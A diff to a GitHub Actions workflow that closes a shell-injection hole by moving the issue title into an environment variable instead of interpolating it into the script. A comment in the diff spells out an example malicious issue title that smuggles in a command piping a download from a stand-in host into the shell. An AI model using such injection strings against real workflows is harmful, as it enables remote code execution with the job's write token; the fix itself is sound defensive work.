@@ -52,6 +52,10 @@ jobs:
         id: plan
         env:
           ISSUE_BODY: ${{ github.event.issue.body }}
+          # Via env, never interpolated into the script. An issue titled
+          # `Add series: x"; curl evil.sh | sh; #` would otherwise run as shell
+          # in a job that holds a write token.
+          ISSUE_TITLE: ${{ github.event.issue.title }}
           INPUT_NOTES: ${{ inputs.notes }}
           INPUT_ID: ${{ inputs.series_id }}
         run: |
@@ -65,7 +69,7 @@ jobs:
             SERIES=$(printf '%s' "$NOTES" | grep -iom1 '\*\*Slug:\*\*[[:space:]]*[A-Za-z0-9_-]*' | sed 's/.*\*\*[[:space:]]*//')
           fi
           if [ -z "$SERIES" ]; then
-            SERIES=$(echo "${{ github.event.issue.title }}" | sed 's/.*: *//')
+            SERIES=$(printf '%s' "$ISSUE_TITLE" | sed 's/.*: *//')
           fi
           # Whatever the source, force it into a safe slug.
           SERIES=$(printf '%s' "$SERIES" \
